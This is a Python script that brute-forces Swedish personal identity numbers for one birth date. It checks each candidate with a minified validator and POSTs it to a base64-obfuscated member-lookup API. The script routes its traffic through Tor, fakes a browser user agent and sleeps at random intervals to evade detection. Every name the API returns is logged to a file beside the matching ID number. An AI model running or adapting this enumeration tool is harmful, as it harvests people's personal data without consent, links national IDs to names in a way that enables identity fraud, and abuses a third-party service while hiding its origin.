#!/usr/bin/env python3

import base64
import datetime
import json
import math
import os
import random
import re
import requests
import time

S='check'
R='century'
Q=float
P=len
K=True
M='num'
J='day'
I='month'
H='year'
B=None
G=str
C=False
A=int
T=G
class E(Exception):0
class L:
	def __init__(A,ssn,options=B):
		D=options
		if D is B:D={}
		A.options=D;A.parts=A.get_parts(ssn)
		if A.valid()is C:raise E(G(ssn)+' Not valid')
	def format(B,long_format=C):
		if long_format:A='{century}{year}{month}{day}{num}{check}'
		else:A='{year}{month}{day}{sep}{num}{check}'
		return A.format(**B.parts)
	def get_age(B):
		C=F();E=A('{century}{year}'.format(century=B.parts[R],year=B.parts[H]));G=A(B.parts[I]);D=A(B.parts[J])
		if B.is_coordination_number():D-=60
		return C.year-E-((C.month,C.day)<(G,D))
	def is_female(A):return not A.is_male()
	def is_male(B):C=B.parts[M];return A(C)%2!=0
	def is_coordination_number(B):return D(A(B.parts[H]),A(B.parts[I]),A(B.parts[J])-60)
	@staticmethod
	def get_parts(ssn):
		W='-';V='+';N='^(\\d{2}){0,1}(\\d{2})(\\d{2})(\\d{2})([\\-|\\+]{0,1})?((?!000)\\d{3})(\\d{0,1})$';B=re.match(N,G(ssn))
		if not B:raise E('Could not parse "{}".'.format(ssn))
		C=B.group(1);K=B.group(2);O=B.group(3);P=B.group(4);D=B.group(5);Q=B.group(6);T=B.group(7)
		if not C:
			L=F().year
			if D==V:L-=100
			else:D=W
			U=L-(L-A(K))%100;C=G(A(U/100))
		else:D=W if F().year-A(C+K)<100 else V
		return{R:C,H:K,I:O,J:P,'sep':D,M:Q,S:T}
	def valid(B):
		E=B.parts[H];F=B.parts[I];G=B.parts[J];Q=B.parts[M];L=B.parts[S]
		if P(L)==0:return C
		N=O(E+F+G+Q)==A(L)
		if N and D(A(E),A(F),A(G)):return K
		return N and D(A(E),A(F),A(G)-60)
def O(data):
	C=0
	for D in range(P(data)):
		B=A(data[D]);B*=2-D%2
		if B>9:B-=9
		C+=B
	return A(math.ceil(Q(C)/10)*10-Q(C))
def N(ssn,options=B):
	A=options
	if A is B:A={}
	return L(ssn,A)
def valid(ssn):
	try:N(ssn);return K
	except E:return C
def F():return datetime.datetime.now()
def D(year,month,day):
	E=month
	for F in ['19','20']:
		B=F.__str__()+year.__str__();B=A(B)
		try:
			D=datetime.date(B,E,day)
			if D.year==B and D.month==E and D.day==day:return K
		except ValueError:continue
	return C
def U():B='socks5://127.0.0.1:9150';A=requests.session();A.proxies={'http':B,'https':B};return A


pd = {}
pn = '19930402' 
fn = pn + '.txt'
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'
url = base64.b64decode(b'aHR0cHM6Ly9tZWRsZW0ubWF0dGVjZW50cnVtLnNlL2FwaS9mcm9udGVuZC9wZXJzb24=').decode('utf-8')

if os.path.isfile(fn) == False:
    f = open(fn, 'w')
    f.close()

with open(fn) as f:
    pd = {int(k): v for line in f for (k, v) in [line.strip().split(None, 1)]}


f = open(fn, 'a')
count = 0
session = U()

while count < 42:
    while True:
        d =  str(random.randint(0, 9999)).zfill(4)
        pnd = pn + d
        if int(pnd) in pd:
            continue
        try:
            p = L(pnd)
        except:
            continue

        break

    pl = {
        'personalNumber': pnd,
    }
    data = session.post(url,
            data = json.dumps(pl),
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/json;charset=UTF-8', 
                }
            )
    
    dd = data.json()
    name = dd.get('name')
    if str(name) == "None" or pnd in pd:
        continue
    pd[pnd] = name
    f.write('{} {}\n'.format(pnd, name))
    count = count + 1
    time.sleep(random.randint(1, 10))
